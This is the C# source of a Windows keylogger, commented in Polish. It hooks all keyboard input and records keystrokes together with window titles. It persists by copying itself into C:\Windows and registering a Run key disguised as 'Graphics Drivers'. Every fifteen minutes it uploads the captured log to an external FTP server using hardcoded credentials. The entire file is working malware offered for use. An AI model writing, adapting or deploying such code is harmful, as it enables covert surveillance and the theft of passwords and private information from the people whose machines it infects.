using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Timers;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Resources;
using System.Reflection;
using System.Threading;

namespace keylogger
{
    class Program
    {
	    [DllImport("user32.dll")]
	    static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

	    [DllImport("user32.dll")]
	    static extern bool UnhookWindowsHookEx(IntPtr hInstance);

	    [DllImport("user32.dll")]
	    static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

	    [DllImport("kernel32.dll")]
	    static extern IntPtr LoadLibrary(string lpFileName);

	    [DllImport("user32.dll")]
	    static extern IntPtr GetForegroundWindow();

	    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	    static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

	    public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);

	    public struct keyboardHookStruct
	    {
		    public int vkCode;
		    public int scanCode;
		    public int flags;
		    public int time;
		    public int dwExtraInfo;
	    }

	    const int WH_KEYBOARD_LL = 13;
	    const int WM_KEYDOWN = 0x100;
	    const int WM_KEYUP = 0x101;
	    const int WM_SYSKEYDOWN = 0x104;
	    const int WM_SYSKEYUP = 0x105;

	    static IntPtr hhook = IntPtr.Zero;
	    static IntPtr hCurrentWindow = IntPtr.Zero;
	    static string Log = String.Empty;
	    static string windowTitle = String.Empty;
	    static byte shift = 0;

	    //KONFIGURACJA
	    static int ti = 15; //co ile minut wysyłać logi
	    static string rv = "Graphics Drivers"; //nazwa klucza w rejestrze
	    static string fl = "ftp://ftp.60free.ovh.org/www/"; //serwer ftp
	    static string fu = "user"; //użytkownik ftp
	    static string fp = "pass"; //hasło do ftp

	    static void Main()
	    {
		    bool keepRunning = true;

		    IntPtr hInstance = LoadLibrary("User32");
		    hhook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, hInstance, 0);

		    System.Timers.Timer myTimer = new System.Timers.Timer();
		    myTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
		    myTimer.Interval = ti*60000;
		    myTimer.Enabled = true;

		    string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
		    string dest = "C:\\Windows\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
		    
		    if(!File.Exists(dest))
			    System.IO.File.Copy(src, dest);

		    string RUN_LOCATION = @"Software\Microsoft\Windows\CurrentVersion\Run";
		    string VALUE_NAME = rv;

		    RegistryKey key = Registry.CurrentUser.CreateSubKey(RUN_LOCATION);
		    key.SetValue(VALUE_NAME, dest);

		    while (keepRunning)
		    {
			    System.Windows.Forms.Application.Run();
		    }

		    myTimer.Enabled = false;
		    UnhookWindowsHookEx(hhook);

	    }

	    private static void OnTimedEvent(object source, ElapsedEventArgs e)
	    {
		    string logFinal = String.Empty;

		    logFinal = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"></head><body>";

		    logFinal += Log;

		    logFinal += "</body></html>";

		    using (StreamWriter outfile = new StreamWriter(@"C:\temp_log.dat"))
		    {
			    outfile.Write(logFinal);
		    }

		    FtpWebRequest ftp = (FtpWebRequest)WebRequest.Create(fl + DateTime.Now.ToString("HH-mm-ss_d-M-yyyy") + ".html");
		    ftp.Credentials = new NetworkCredential(fu, fp);
		    ftp.KeepAlive = true;
		    ftp.UseBinary = true;
		    ftp.Method = WebRequestMethods.Ftp.UploadFile;
		    FileStream fs = File.OpenRead(@"C:\temp_log.dat");
		    byte[] buffer = new byte[fs.Length];
		    fs.Read(buffer, 0, buffer.Length);
		    fs.Close();
		    Stream ftpstream = ftp.GetRequestStream();
		    ftpstream.Write(buffer, 0, buffer.Length);
		    ftpstream.Close();

		    Log = String.Empty;
		    logFinal = String.Empty;
		    System.IO.File.Delete(@"C:\temp_log.dat");
	    }

	    public static int hookProc(int code, int wParam, ref keyboardHookStruct lParam)
	    {
		    if (code >= 0)
		    {
			    Keys key = (Keys)lParam.vkCode;
				    KeyEventArgs kea = new KeyEventArgs(key);
				    if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
				    {
					    if (hCurrentWindow != GetForegroundWindow())
					    {
						    StringBuilder sb = new StringBuilder(256);
						    hCurrentWindow = GetForegroundWindow();
						    GetWindowText(hCurrentWindow, sb, sb.Capacity);
						    Log += "<br /><br /><strong>[ Okno: " + sb.ToString() + "]</strong><br /><br />";
					    }

					    if (Keys.Shift == Control.ModifierKeys) shift = 1;
					    else shift = 0;

					    switch (kea.KeyCode)
					    {
						    case Keys.Back: Log += "<i>[Backspace]</i>";
						    break;
						    case Keys.Tab: Log += "<i>[Tab]</i>";
						    break;
						    case Keys.LineFeed: Log += "<i>[LineFeed]</i>";
						    break;
						    case Keys.Clear: Log += "<i>[Clear]</i>";
						    break;
						    case Keys.Return: Log += "<br /><i>[Enter]</i><br />";
						    break;
						    case Keys.RMenu: Log += "<i>[RAlt]</i>";
						    break;
						    case Keys.LMenu: Log += "<i>[LAlt]</i>";
						    break;
						    case Keys.CapsLock: Log += "<i>[CapsLock]</i>";
						    break;
						    case Keys.Escape: Log += "<i>[Escape]</i>";
						    break;
						    case Keys.Space: Log += " ";
						    break;
						    case Keys.Delete: Log += "<i>[Delete]</i>";
						    break;
						    case Keys.D0:
							    if(shift == 0)
								    Log += "<span style=\"color: #808080;\">0</span>";
							    else
								    Log += "<span style=\"color: #000080;\">)</span>";
						    break;
						    case Keys.D1:
							    if (shift == 0)
								    Log += "<span style=\"color: #808080;\">1</span>";
							    else
								    Log += "<span style=\"color: #000080;\">!</span>";
						    break;
						    case Keys.D2:
							    if (shift == 0)
								    Log += "<span style=\"color: #808080;\">2</span>";
							    else
								    Log += "<span style=\"color: #000080;\">@</span>";
						    break;
						    case Keys.D3:
							    if (shift == 0)
								    Log += "<span style=\"color: #808080;\">3</span>";
							    else
								    Log += "<span style=\"color: #000080;\">#</span>";
						    break;
						    case Keys.D4:
							    if (shift == 0)
								    Log += "<span style=\"color: #808080;\">4</span>";
							    else
								    Log += "<span style=\"color: #000080;\">$</span>";
						    break;
						    case Keys.D5:
							    if (shift == 0)
								    Log += "<span style=\"color: #808080;\">5</span>";
							    else
								    Log += "<span style=\"color: #000080;\">%</span>";
						    break;
						    case Keys.D6:
							    if (shift == 0)
								    Log += "<span style=\"color: #808080;\">6</span>";
							    else
								    Log += "<span style=\"color: #000080;\">^</span>";
						    break;
						    case Keys.D7:
							    if (shift == 0)
								    Log += "<span style=\"color: #808080;\">7</span>";
							    else
								    Log += "<span style=\"color: #000080;\">&</span>";
						    break;
						    case Keys.D8:
							    if (shift == 0)
								    Log += "<span style=\"color: #808080;\">8</span>";
							    else
								    Log += "<span style=\"color: #000080;\">*</span>";
						    break;
						    case Keys.D9:
							    if (shift == 0)
								    Log += "<span style=\"color: #808080;\">9</span>";
							    else
								    Log += "<span style=\"color: #000080;\">(</span>";
						    break;
						    case Keys.A:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">a</span>";
							    else
								    Log += "<span style=\"color: #008000;\">A</span>";
						    break;
						    case Keys.B:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">b</span>";
							    else
								    Log += "<span style=\"color: #008000;\">B</span>";
						    break;
						    case Keys.C:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">c</span>";
							    else
								    Log += "<span style=\"color: #008000;\">C</span>";
						    break;
						    case Keys.D:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">d</span>";
							    else
								    Log += "<span style=\"color: #008000;\">D</span>";
						    break;
						    case Keys.E:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">e</span>";
							    else
								    Log += "<span style=\"color: #008000;\">E</span>";
						    break;
						    case Keys.F:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">f</span>";
							    else
								    Log += "<span style=\"color: #008000;\">F</span>";
						    break;
						    case Keys.G:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">g</span>";
							    else
								    Log += "<span style=\"color: #008000;\">G</span>";
						    break;
						    case Keys.H:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">h</span>";
							    else
								    Log += "<span style=\"color: #008000;\">H</span>";
						    break;
						    case Keys.I:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">i</span>";
							    else
								    Log += "<span style=\"color: #008000;\">I</span>";
						    break;
						    case Keys.J:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">j</span>";
							    else
								    Log += "<span style=\"color: #008000;\">J</span>";
						    break;
						    case Keys.K:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">k</span>";
							    else
								    Log += "<span style=\"color: #008000;\">K</span>";
						    break;
						    case Keys.L:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">l</span>";
							    else
								    Log += "<span style=\"color: #008000;\">L</span>";
						    break;
						    case Keys.M:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">m</span>";
							    else
								    Log += "<span style=\"color: #008000;\">M</span>";
						    break;
						    case Keys.N:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">n</span>";
							    else
								    Log += "<span style=\"color: #008000;\">N</span>";
						    break;
						    case Keys.O:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">o</span>";
							    else
								    Log += "<span style=\"color: #008000;\">O</span>";
						    break;
						    case Keys.P:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">p</span>";
							    else
								    Log += "<span style=\"color: #008000;\">P</span>";
						    break;
						    case Keys.Q:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">q</span>";
							    else
								    Log += "<span style=\"color: #008000;\">Q</span>";
						    break;
						    case Keys.R:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">r</span>";
							    else
								    Log += "<span style=\"color: #008000;\">R</span>";
						    break;
						    case Keys.S:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">s</span>";
							    else
								    Log += "<span style=\"color: #008000;\">S</span>";
						    break;
						    case Keys.T:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">t</span>";
							    else
								    Log += "<span style=\"color: #008000;\">T</span>";
						    break;
						    case Keys.U:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">u</span>";
							    else
								    Log += "<span style=\"color: #008000;\">U</span>";
						    break;
						    case Keys.V:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">v</span>";
							    else
								    Log += "<span style=\"color: #008000;\">V</span>";
						    break;
						    case Keys.W:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">w</span>";
							    else
								    Log += "<span style=\"color: #008000;\">W</span>";
						    break;
						    case Keys.X:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">x</span>";
							    else
								    Log += "<span style=\"color: #008000;\">X</span>";
						    break;
						    case Keys.Y:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">y</span>";
							    else
								    Log += "<span style=\"color: #008000;\">Y</span>";
						    break;
						    case Keys.Z:
							    if (shift == 0)
								    Log += "<span style=\"color: #008000;\">z</span>";
							    else
								    Log += "<span style=\"color: #008000;\">Z</span>";
						    break;
						    case Keys.Oemtilde:
							    if (shift == 0)
								    Log += "<span style=\"color: #000080;\">`</span>";
							    else
								    Log += "<span style=\"color: #000080;\">~</span>";
						    break;
						    case Keys.OemMinus:
							    if (shift == 0)
								    Log += "<span style=\"color: #000080;\">-</span>";
							    else
								    Log += "<span style=\"color: #000080;\">_</span>";
						    break;
						    case (Keys)187:
							    if (shift == 0)
								    Log += "<span style=\"color: #000080;\">=</span>";
							    else
								    Log += "<span style=\"color: #000080;\">+</span>";
						    break;
						    case Keys.OemOpenBrackets:
							    if (shift == 0)
								    Log += "<span style=\"color: #000080;\">[</span>";
							    else
								    Log += "<span style=\"color: #000080;\">{</span>";
						    break;
						    case Keys.Oem6:
							    if (shift == 0)
								    Log += "<span style=\"color: #000080;\">]</span>";
							    else
								    Log += "<span style=\"color: #000080;\">}</span>";
						    break;
						    case Keys.Oem5:
							    if (shift == 0)
								    Log += "<span style=\"color: #000080;\">\\</span>";
							    else
								    Log += "<span style=\"color: #000080;\">|</span>";
						    break;
						    case Keys.Oem1:
							    if (shift == 0)
								    Log += "<span style=\"color: #000080;\">;</span>";
							    else
								    Log += "<span style=\"color: #000080;\">:</span>";
						    break;
						    case Keys.Oem7:
							    if (shift == 0)
								    Log += "<span style=\"color: #000080;\">'</span>";
							    else
								    Log += "<span style=\"color: #000080;\">\"</span>";
						    break;
						    case Keys.Oemcomma:
							    if (shift == 0)
								    Log += "<span style=\"color: #000080;\">,</span>";
							    else
								    Log += "<span style=\"color: #000080;\"><</span>";
						    break;
						    case Keys.OemPeriod:
						    if (shift == 0)
							    Log += "<span style=\"color: #000080;\">.</span>";
						    else
							    Log += "<span style=\"color: #000080;\">></span>";
						    break;
						    case Keys.OemQuestion:
						    if (shift == 0)
							    Log += "<span style=\"color: #000080;\">/</span>";
						    else
							    Log += "<span style=\"color: #000080;\">?</span>";
						    break;
					    }
				    }
		    }
		    return CallNextHookEx(hhook, code, wParam, ref lParam);
	    }

    }
}